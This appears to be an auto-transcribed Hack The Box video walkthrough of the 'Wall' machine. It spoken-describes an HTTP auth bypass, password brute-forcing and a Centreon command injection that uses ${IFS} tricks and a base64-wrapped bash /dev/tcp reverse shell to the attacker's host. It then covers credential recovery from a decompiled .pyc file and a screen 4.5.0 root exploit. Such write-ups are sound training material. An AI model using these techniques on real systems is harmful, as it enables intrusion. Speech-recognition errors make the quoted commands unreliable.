 what's going on YouTube is upset I'm doing Walt from half the box and it didn't do too well in the ratings my guess is the initial foot hole in this box is a bit of a stretch but once you get past that I think it's a pretty cool box that shows off some static analysis and then I'll also be showing off a new Linux privilege escalation script that I found called Len Peas that is the privilege escalation awesome sweet that does a lot of extra checks then Lenin oome and includes a lot of highlighting that makes it really easy to find privilege escalation vectors the initial foothold you had to run a go Buster adder bust to find the slash monitoring directory that required authentication but if you send a post request at bypass authentication you get to the slash sentry on page and then for that you had to brute-force you access into the application once you got in the app there's plenty of authenticated RCS to choose from to get a shell in the box so with all that being said let's just jump in and see what this is all about as always we start off with it and map so - SC for D flow scripts as via memory versions Oh a output all formats plan the end map director and call it wall and then the IP address which is 10 10 10 157 can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on port 22 and it's banner leaks that it's a Ubuntu server then we also have HTTP on port 80 and it's banners telling us it's Apache HTTP D and that it is also Ubuntu - and map scripts the first ones just the server header telling us information we already now then we have HTTP title telling us it's the Apache to Ubuntu default page so there isn't really much information we got from nmap other than so ubuntu webserver and since it is a web server I guess that's where we're gonna start because there isn't that many interesting things in SSH I think the last exploit just allowed you to enumerate valid user names so web servers have much more attack service so that's why we're starting there we do have the default page doesn't look like anything too interesting I can check a few pages like robots.txt maybe there's something there admin dev we can check like HT access they get it for bid and so nothing too interesting so there's two routes we can take we can either directory brute force and find hidden files or we can try like a hostname brute force and maybe as virtual host routing I normally start off with the directory brute force so I'm going to run go Buster - eh we want to put in dir mode you can do - H again to see the options here the ones we want is - you for URL HTTP 10 10 10 157 - W for word list user share word list and then I like using dirt Buster than directory list 2 3 I'm gonna do small I'd only do medium but won't do small on this one and then I always like writing to an out file so - oh go Buster dot root and let this go if I had seen like a PHP cookie I may do - X PHP to do PHP scripts but at this point I have no idea what language the webserver is so I'm not even gonna bother with extensions I just want to see if there's any directories so I'm gonna speed up the video a little bit so we get a result quickly and we have monitoring and it's telling us it's a status 401 which I believe is HTTP auth required so let's just go check that out so go into slash monitoring and we get authentication required so I'm gonna try like admin admin ghast guest admin password and we don't get in right away so what I'm going to do is set up Hydra because we always wanted to be we always want to be doing something automate in the background while we manually poke at something so Hydra - el admin - capital P for password list if you did capsule capital L it would do a username list user share and we will do SEC list and then passwords and I'm gonna do Dirk web 2017 top 1000 text when doing brute force is remotely like passwords or things I really don't like using huge word list just because it takes forever if it's like a directory or something that's fine if I'm cracking something I wanted to be as big as possible but for like a remote username brute force it's pretty slow so I use small word list I'm going to specify - F and this is gonna stop the Hydra upon a successful login and we're going to specify the IP address which is 10 10 10 157 and then the method we want is HTTP - git and then the URL is slash monitoring I think it slash monitoring yep so let that go it looks like it's running and then while this goes let's do something in the background we can do proxy intercept is on not a bunch of random Firefox stuff I need to disable but that's besides the point we can go to foxy proxy tell it to go through a burp suite go to this page and then this is a really silly thing that we're going to get into after we route the buck to figure out what happened but if we do this get requests we get a unauthorized if we change the request method to be a post and go we get a 301 that says it's been moved permanently and the document has been moved to monitoring slash so I'm just gonna follow this redirection and we get monitoring slash and let's see we do another get and we get unauthorized again so let's change it to a post and see what monitoring slash gets us and we go to slash Centurion so let's go to this URL going back to Firefox we can turn burp suite off and go to slash Centurion and we get a login page additionally we get a version check down near the bottom 1904 zero so the first thing we do is like Centurion github and Centurion just to see what this is and if we go to this it is a page and then looking at this we see it is also open source so the next thing I want to do is probably search Centurion change log I'm just trying to figure out where the latest version is and we see Centurion 1904 and we have 0 1 2 3 4 5 so if we search all these and we can look if there's any security issues and bug fixes documentation security fixes authenticated RCE SQL injection who scripts and service groups that sounds authenticated illegal characters sent core token generation authenticated SQL injection service grid so everything here sounds like it's authenticated going down the list and if we went through all of these they will all be authenticated so I'm not gonna waste your time and go through them all if you want you can read them the next thing I probably do is run search boy on Centurion to see if there's anything we have another remote code execution right here so we can check this out with search boy - X and let's see we got user name and password so again it is gonna be an authenticated exploit so nothing points to on with it unauthenticated so we should probably run another brute force against this looking at the page if we go here and let's intercept the request to see what this looks like we look login with like admin admin go over to burke to make sure we're not intercepting anything clear the queue connect we can see user Elias admin password admin and then centurion token and we got this which is a cross-site request forgery token so if we want to brute force it we have to have a Python script include this much like I think the sense machine I code something like this but there is a another way you can get around like CSRF checks normally so these are to prevent cross-site scripting attacks not really brute forcing so cross-site scripting doesn't really happen with api's so we can look at for like the Centurion api login go to the documentation it does have a REST API and let's see we can see domain sentry API index action equals authenticate and then use name password so let's do go back to terminal and see how this API responds so I'm going to do curl 10 10 10 157 and then paste the URL we got from the site then - d for data to put text in and I think it wanted user name and password it did I'm just kidding right here so username equals will do admin password equals test and then go and we get bad parameters so let's see oh I have comma we want and and we get bad credentials so let's try a different name so admin a SD we get bad credentials as well if we go to burp suite we can try looking at like the time it takes to do this request so let's just copy this entire thing go back to repeater let's do a control you I think good I forget the hot key to change request method so I'll just do it that way paste we just want to get rid of this and I actually wanted post so I'll change it again and put astronauts anacott down here we want it at the top and then we want user and password so username equals admin and password equals test click send bad credentials and I'm clicking a few times it's around 100 to 105 to 110 milliseconds admin ASD and we get the same thing and I'm just looking down here and it's also the same size we could look at logins to the website with that CSRF token but again there's no timing difference and no response difference so we can't validate valid user names so we're just gonna have to guess that the username is admin and we can also try administrator and things like that and finally you could Google like Centurion deep credentials and see what they set its admin / sentry on so probably it should have tried that at the start so let's go back to this curl we can do Centurion and admin to see if they left credentials as default and we get bad credentials so let's brute force this I'm going to do w fuzz - you for your l HTTP slash slash let's copy this entire thing and then - D username equals admin and password equals fuzz and all caps and then we want - W for word list user well that's weird I don't know what I terminal screwed up Oh because bad credentials took some column space so I'm just going to restart this password equals fuzz and - W user share word list and then passwords Oh aren't user share word list user share SEC list passwords and I'm gonna do the dark web 2017 top 1000 again just like Hydra and hit enter we see we get a bunch of four threes so I control C out of that - - HC to hide code 403 and at password one we get a two hundred requests so we can try this with the API with admin password one and now we are authenticated as we're getting to main dot PHP so at this point we have to figure out which authenticated RCE to use because there were a lot so I think I'm gonna go with four zero one because this is probably going to be what the Oh fix ACL with get that doesn't have a CVE so I'm going to ignore it maybe zero no cuz zero is what we're at so let's go two for two for three where's the security fix here we go this is what I'm gonna do so how to escape shell legs - nog you spin binary if we search this CVE let's see nothing there we go here this is the authors page and it looks like I forgot to renew his domain so I'm gonna click down here go to cached and I hit ctrl so it opens a new tab and we got a github page this is probably the same exact thing that was in search boy so we're getting to analyze this at the end of the video so I'm just going to go through the exploit without reading that and walking through it so it's pretty simple if we go to the configure Polar's and this goes back to what I've said with every time we get into like a application meant for admins you almost always find some type of command injection because they just use a lot of dangerous functionality so the exploit is if we change this field and do the debug option it will actually execute this to kind of test it out but we can run any binary we want so I'm going to run let's do I guess we can IP addr I'm gonna put a semicolon there as well save don't have permission so we got a weird error message let's try something else which I IP addr with out a semicolon let's see what happens click save don't have mission so let's try we can do PA and then semicolon the reason why I like having semicolons is if there's a command after it if we're injecting into the middle of the command it'll work better so this time we didn't get any error message so we can click this and then do export configuration and then click export and we can see the output of PS so we definitely have command execution if you wanted a test for like blind command execution we could always test with ping so if we go back here we can try paying ten ten fourteen three and we probably should do I think it's - c-141 ping - H oh man there's a lot of options of paying 27001 one yeah - Lee is Linux I always get Windows and Windows confused so I test it TCP dump - I tun zero which is my VPN interface ICMP and before ICMP we want - and to not do DNS lookups so let's try this ping - c1 save don't have permission so maybe we can try ping well every time we've been doing a space we've been getting that so I did IP space addr we got that error message I did ping space - see I got that error message so I'm gonna try echo test and we'll just see if this airs out it does so I've kind of troubleshooting this into this monitoring engine binary doesn't like spaces and there's two ways we can deal with the space we go back to a terminal we can go up here hi Joe didn't crack that password so that's nothing we can do echo and then ifs I think that's internal field separator test and by default the internal field separator is space so that's putting a space in there because bash will translate this into a space and then yeah it turns a command in to echo space test bash also has will auto expand what's and brackets like this so if we do echo test like that it also works so let's try this I generally like doing this first just because it's easier to read for me this will work in more cases because this is like a specific thing much like the /dev tcp options so very bad specific but let's see if it works so we can do ping comma 10 10 14 3 and we probably want - c comma 1 comma so save didn't air out because we don't have a space export configuration click export command not found so doesn't look like we can do it that way let's just go back to Polar's central and then let's try echo ping - c1 10 10 14 3 and then said s space ifs and when doing things like this that's how I like doing it so try this we probably want to put semicolon at the end I didn't run a semicolon at the end the last time did I let's go back and try ping so this we get a response we see it work and here we got it working so let's go back to configure Polar's and see what happens if we don't put that semicolon at the end if that is a requirement for this so if we get command not found we'll revisit doing brackets so export config export permission denied and socket so it looks like it still ran oops go back to Polar's so what we have to do is get a reverse shell nail so we can do go back to this Edgar thing and we can say - see then I'm going to put this in double quotes then was it bash - I this div tcp ten ten fourteen three point nine thousand one zero at and one and then like this there we go that is ugly but it is potentially going to work so we can get rid of this tcp dump and do n CL v NP 9001 to list them on point nine thousand one paste this in click Save and then click export configuration export aborted and it did not work so let's see let's just copy this paste it in and we get ambiguous redirect probably because it doesn't like doing all these ifs a--'s so instead of trying to escape all this let's just put it in an encoding that doesn't require that doesn't have spaces to begin with so we're going to go back to this command and I'm just going to run this to make sure this works it does so we can exit that start listening again so what I'm going to do is a 64 it whoops don't want to run and now it is hung yeah grab dev it can kill seven one five two four there we go so I want to echo this okay so we echo that and I definitely want these single quotes so maybe vex tech nope let's see click this in single double like that there we go so this is the command we want to run I can type that now to base64 so what we want to do is go back to where we had to said and we're going to run the command echo or base64 pipe this to base64 - D then pipe this to bash and since we're piping it to bash we probably didn't need this bash - see but yeah we'll see how it goes and that is an ugly command but it is a command so let's try this and we have to listen on 9001 so there's that Polar's configure central paste save so it accepted that export configuration export and did not work so I'm going to go back to a base64 and get rid of this - - see so we can just echo this we can PI do single quotes copy do that I'm also going to copy this entire line because I want to make sure this works before I run it so copy that get rid of this okay so that looks good and I'm just going to run this command to make sure this works it does so if the server behaves as we think it does this will definitely work so copy pullers configure and then we can click this paste it save and then export configuration and I'm just realizing probably what I'm forgetting to do is I'm not putting a semicolon at the end so let's just try that so let's go back here we can try semicolon semicolon string at the beginning and back to make sure if we inject in the middle of the command it would still work so export this we don't get a response back so putting those semicolons is definitely needed and it just aborted so that wasn't it let's try just putting the one at the back so when you find command execution it's definitely picky and will help to do static code analysis if you can or insert debug statements which we'll do at the end of the video so let's exploit this run this time it doesn't say aborted and we get a shell so the issue was we have to put a semicolon at the end of the command so we do Python C input PT y PT y dot spawn then bash and then ctrl Z to background st py raw - echo FG - put it in the foreground then I'm gonna an export term is equal to X term so now when I hit control L it can clear the screen and then if you want to you can open a new pane and we can do s TTY - a and look for rows and columns 35 and 137 and what we're going to do is fix it because as you see like it's overwriting this is the effect of rows being Zeron columns being 0 so we wanted 35 and 137 so stty rows 35 and then stty columns I think I said 137 so now my A's work properly so now we have a fully functional TTY that would probably work if we use vim and other things so if we go to /home to try to grab the flag we see there are two users Shelbie insist monitor we can go into both directories so I'm just gonna do fine dot - type F and we can see all the directories this monitor let's see let's just go sis mantra first because this was more results than I thought so this monitor has a double you get HSTs maybe a history file I don't know what that is cats this monitor dot W get looks like known host for W get okay but nothing too interesting in sis mantra so let's go to the Shelby directory so go back to find and Shelby and let's see HTML zip let's go in what's that - LS there we go that looks better we got HTML zip a bunch of RPM stuff profile user text only shelby can read user dot text so we can't access that HTML zip let's see what this is so CP this we can just copy it into I guess dev s hm go into that directory and then unzip HTML to see what this is and we get a few files a a dot PHP and panel dot PHP we can look at this echo 1 so these are just I guess PHP troll files nothing too interesting if we can cat monitoring HT access because this may have like a password hash we get let's see this is the htaccess file for monitoring and this limit get required valid user is why when we did a post request it didn't it it just worked because we were now and post not get and they required valid user only forget so that's why that weird bypass worked we do have a HT passwd file if we cat this we can get the potential hash but we get the hash of this admin user and I threw this over into rock you before when I was doing this box and hat was not able to crack this ash so I'm not gonna worry about that so that's a dead end but that's generally something I would look into doing let's see what else is there to look at well if we went back into Shelby there are we know this user was active in the box between July 4th and July 30th so what I'm going to do is do find / - type F - newer mt4 modified time 2000 1907 o3 and then - newer MT 2000 1907 31 we can try it like this and then to Def null so error messages get hidden and let's see we got a ver backups shadow dot back let's just do a - LS real quick so shadow dot back we can we can't read that that is route chat or looking at the permissions so we could also add a I think there's a - readable is that oh well I guessed at that one and that worked let's see for a Lib D package we can probably get rid of that so let's see my pipes is - West - s then it puts everything on one line so let's see July 4th July 30th as a ton I'm just gonna get everything that has I guess disk that packages out of here so we can do grab - V disk - packages because that was a lot of results and right at the top we have /opt she'll be back up that we can read so that's probably a good one so if we go into this directory it's not a directory it's a file and we do file against it we can see it's a Python 2.7 byte compiled file so whenever you run a pipe script it creates a dot pyc file which is the compiled form of python we can execute back up to see what it does it just says done LS la Shelby and we can see that HTML zip is now has today's date on it so this script somehow did authentication and Python compiled files are reversible so what I'm going to do is basics t4 - D backup okay not D basics T for backup and we can copy this to a Kali machine so we'll call this V backup pyc paste it and we probably should of named that py c dot b 64 base64 - d that to backup dot p YC and we can run file against it it's a Python 2.7 byte compiled and to decompile it we use a program called uncompelled and you can get that through pip so pip install on compile like that and it's belt pyl we instead of pil e but now that we have the file we can run uncompelled - against backup py c and we can see what it does I'm just going to direct this to a file backup dot pi and we can read the file so it's going to input parameter which is a SSH utility username shell will be host Walt HT B port 22 and then it is loading a string oddly I don't know why did it that way maybe to get um if you did strings against the binary maybe it won't show up this way and then logging in via Perico and putting the dub dub dub HTML dip into the users home dress so what we're going to do is get rid of this get rid of all the top because all we want is password and I don't want to type it out so we're just going to print password and then we can run Python backup PI and we get the password shall we password is strong copy it SSH she'll be at 10 10 10 157 yes paste the password and we get walked in so here we can read user dot text this actually doesn't get us anything other than the ability to read user that text because the exploit is exploitable from the wwu so I'm just gonna exit out of the shell and we'll do everything from here so that was kind of a side quest that didn't really get us to much for the privilege escalation if you just Morean like linen oom you may miss this one there is a really cool presque script that I just found out which is Lin pas I guess Lin peas for a privilege escalation awesome script sweet so if we go here let's go and download this it also has windows and the really cool thing about this script sweet sweet is it will color code things you should look at so if we go up get clone paste this in let's go to this directory blend so we just need the SH file so I'm going to make two htb boxes wool dub dub dub I'm going to copy this into that if you're wondering how I type that so quickly if I hit alt period it cycles through all the previous arguments I've typed so that's what I'm doing there so go into that directory and we can do Python hm simple HTTP server and let's curl ten ten fourteen three slash went one port 8000 slash when pssh we don't have curl CD dev s hm I'm just gonna W get this and I know W get as a way to pipe to stand it out I just don't read it myself down my head so that's why whenever I use W get I just drop it to a file instead of executing it how I do with curl and just doing it to a pipe so we just execute the script and we can see there's a lot of pretty colors and this is showing us different processes executed during one minute so there's showing us kind of like cron jobs so I'm just gonna let this whole script run and we'll go through each thing now the script is finished let's just go to the top and look at what everything means you can see some colors now they don't look too impressive until after you read the legend we have red and yellow 99% privilege escalation vector red we should look at it late Scion uses with console blue users without a console but mounted devs green common things such as other users groups set UID whatnot and white magenta or things running in our context the very first thing that is different than most privileged escalation scripts is it has built-in host discovery and port scanning pretty cool but nothing groundbreaking the next things are basic things from linen oome such as operating system pseudo dates file system environment but the first unique thing is right here we got looking for signature verification failed and D message and this is showing us kernel modules that are not signed modern kernel modules are generally signed and if they're not signed chances are it's either like a rootkit or just old module either which you should definitely look into so pretty cool it has that checking out of the bat we got SC Linux that's an actual human readable format printers is this a container pretty cool things listing out the discs useful software if compilers are installed clean processes so this is highlighting every process that is ran by route by putting it in read so you should always look at every process that so that's cool we got binary process permissions different processes executed during one minutes so this is just looking at everything that runs in the box if there's a cron that runs every minute this will see it it's a pretty cool thing to have cron jobs it doesn't highlight the custom Cron's surprisingly I wish it did if they just have like a database of krons that are known because these are definitely custom and there is a professed path I think in Centurion that runs every day once a day so it's not really a fun one to do one hack the box but that wasn't unintended one searching for outdated versions of software Hearst name's Annette IP stuff IP tables this is highlighting every port that is only listening on localhost which is interesting I have no idea what port 90 42 is so let's just take a look at that at the end of this box so let's do boot notes and then 90 42 it's a port probably some like PHP interpreter then one 2700 one three three or six that is my sequel and 161 can I sniff with TCP dump No so pretty cool that checks that what user we are PGP keys clipboard sudo do as which is the studio for BSD I believe testing su without passwords so this one is interesting because this will definitely set off types of alerts so this is a bit more noisy than your typical Linux enumeration script usually with console my sequel version looking at ways we can connect to the database and route can log in localhost entry on user and centurion without a password more data based off PHP cookies WordPress config files is looking for Wi-Fi connections LDAP directories AWS keys and a fast cabana elasticsearch vault so it has a lot of custom checks looking for screen sessions tea mock sessions and we get two interesting files and this is the first thing that makes it super obvious what we should be exploiting bin mount if this was Apple there's probably a probe a skier screen for 5-0 and this is highly probable privilege escalation vector piling in here I'm not sure why it's not red and yellow maybe that's a setting on my terminal but this one we should definitely look at so keep screen in the back of the notes when you get set G ID is set UID binaries linux capabilities got sh files in the path so just a lot of cool things to look through so let's just go back out of here and do this screen exploit since I've highlighted enough of that um let's do search boy screen maybe 4.5 maybe we can grep for 4.5 there we go so we got to we got a text and a dot Sh so this one says P or C but it's a tax file and the one that doesn't say PR sees a shell script which is kind of funny but let's just look at this and I really hate how this is formatted um let's just do the shell script so 4 1 1 5 4 by 4 dot SH and got a file here let's see we don't need that echo so I can copy everything and then we just paste it and run it so it's creating 2 dot C files and then compiling them and then doing a LD preload and this is echoing a newline character inside the screen I think I explained this in the haircut video one of the old ones this probe ask has been done before so I'm not going to explain in depth again but let's just do screen sh paste and instead of calling it screen dot SH I'm gonna call it exploit Sh just in case something weird happens with the path and I hate calling things the same name as it is so like since this is exploiting screen I hate having screen in the name so Rana do ID and we are root so if we go to CD / root you can do WC - see root text and 30 30 characters which is md5 somewhat a line break so that is the box but not the end of the video as I want to look into one of the blog posts by the author of this box to see how he found this vulnerability and then we'll also look into other born bills that were found in this application since then so if we go back to this and Google the CVE we went to the author's web page that right now doesn't work for whatever reason because the dns but we go to the cache we can see he kind of has instructions on how he found this vulnerability through static code analysis and because this is a dead page right now until he'd renews the dns name and the Google cache may go away I'll just go through this how I gently do static code analysis so I think we can do this from the dub-dub-dub data user so since that has my terminal setup would do it from here actually let's do it from SSH Oh actually I want to look at ninety 42 real quick sorry ad D moment SS ln + PT 90 42 is PHP okay so that was a PHP interpreter listening on localhost so let's do this through SSH so we can just do Python was it back up to PI and then we can SSH with this user so this will just get a much more usable terminal so I always like having that so 10 10 10 157 that's 147 157 paste it in well again and I think it's under user local Centurion there we go dub dub dub so this is the web directory so in previous boxes and whenever we did code analysis we always started from user input and traced where it led to so an example would be grep - earth to grap everything in this directory - I to make it not case-insensitive and then look for the I guess superglobal variable get post or request and let's see like that and this shows us everywhere that user input has a way to interact with the application either through a get post or request there's a lot of them and this isn't the only way to do code analysis you could do something like dangerous functions so let's just do the notes so dangerous functions I'd stood out with exact shell exact system pass through eval and P open so I think these are the standard ways to call like bash directly in PHP so I traced all these functions and see if user input ever leads to them if I don't see anything here I'd also go down to like the uncivilized call the include call because unsere wise could lead to civilization include if we include PHP files include a file we get code execution and then also like file put contents because that means we can write files and then one of the other ones I like looking at is cookie that have F logic so this would be looking for if there's any if Ben's based around a cookie so the the main three things I look at and analyzing a PHP application so let's just look at exact shell exact system pass through eval and P of them and that is a lot so let's just narrow this down a little bit and I'm gonna start with shell exact because this is getting some JavaScript stuff so we'd have to write filters to only look in PHP files but if we just look at this dangerous function shell exec this becomes a little bit easier so which ones can we rule out well you want to definitely look at this from MIBs dot PHP and if we went back into the changelog and went to 1904 five the most recent one we see there are some security things around the mid input so the author probably looked at this and for some reason did not include it when he was analyzing it because his exploit was found in a much later version so there's probably a vulnerability in here based upon the changelog let's see this one looks like real paths tab zero we'd have to go look at the code to see exactly what tab zero is restart poll were sudo service host and net script reload restart and since I see sudo service I would probably go to GTFO bins get the Frick out bins and type in service and we can see there is a way to get it to execute code with sudo and all you do is specify the shell script so that's definitely interesting if we can write a file so if I wanted to go down that path I would go also down the file put contents to see if we can write a file then execute it with this sudo but right up just standard without a foul right vulnerability we don't really have anything with that generate file we can't really see anything else so this is something we should look at this one there's no user input here CBD - V it's not an absolute path so there's some type of path injection but that probably isn't a vulnerability this one again everything is no user input no user input here and then again sudo service and then we'd have to write a file so I'm going to ignore the studio services and ones that don't have user input and we should only look at these two so this generate file spoiler alert is the one that we just exploited so let's just take a look at this one first and then we'll do the bib so if we VI this file and then search for shell exec we can see where this occurred so let's go to the top to see what the function is the function is print debug which is interesting in itself because it's a debug statement if we went back to the application and went to configure Polar's whoops and click this export configuration we can see so one of these may have been debug but maybe not Oh run marring engine debug so that's why that's working is because we have that run ma during engine debug check so going down this piece because of that and let's see we got Nagios bin is equal to DB servers fetch and then close cursor and let's see DB result select Nagios pin from Nagios server where local host and whatnot but that Naga has been binary is actually we go to configure Polar's is actually this argument and if you did this and looked here it's gonna be small font but we see Nagas bin is the name of this parameter so that is the Nagios bin thing and then for each tab server as host so tab server is going to be if we went back to here and had multiple Polar's that'd be clicking here so we added one you'd have one down here you can do multiple so it's going into each of that table and standard out is equal to shell exact an injectable area Nagios config path host ID and search engine so what we did was injected here and then put a semicolon and then that semicolon got rid of all this so probably when we did the echo command and things or at the PS I mean it was fine with this but when we did the reverse shell these arguments made an error in reverse shell and caused it to crash so that's why we needed the semicolon at the end and we didn't need a semicolon at the beginning because we're injecting right at the start so maybe in PHP if you do shell exec semicolon Who am I semicolon it would fail we can test this real quick with PHP - hey I think to get in trip in the mood shell exact semicolon Who am I semicolon does that work unexpected semicolon to start we do who am i semicolon it doesn't air so if we actor space we get root doing it this way cause an error so she'll exec can't begin with the semicolon so that's why when we put semicolons on both ends it crashed and that's why doing static analysis can definitely help so where was this so standard out HTML special characters so this is converting it into HTML and the encoding all this stuff probably doesn't matter but that's an easy way to find that exploit let's do the same thing but for this mid we look in here then the I shall exact and let's see what function is this this is just in an if/then and we'd have to trace or is shell exact which these variables we have access into injecting and since they already patched it we can just look at the diff so if we wanted to see exactly how to exploit this we could just do a diff on the patch so let's see this is pull request 8023 so if we do github Centurion go here look at issues and we can just paste 8023 and we can look at the pull request for this issue we see file changed we can see everything that changed in this file red means deleted green means updated so let's see moving traps here's what the show exec is so instead of shale exacting into a bunch of things they show exact into a variable called command so let's see ah right here so this is probably the fix so they have this manufacturer ID variable now and they're doing filter var and then the manufacturer ID variable and they're saying validate that it's an integer so beforehand this wasn't there if we look down at the way it executed which is where is it right here we see they're just doing HTML entities on that variable so they replace that with that manufacturer ID and also validate that it's an integer it's not an integer than the code will no longer down so that is how they fix that and I'm guessing that exploit would be the same exact thing just putting like a command here because it's doing a shell exact so hope you guys enjoyed that and I think that'll be the box so take care and I will see you all next week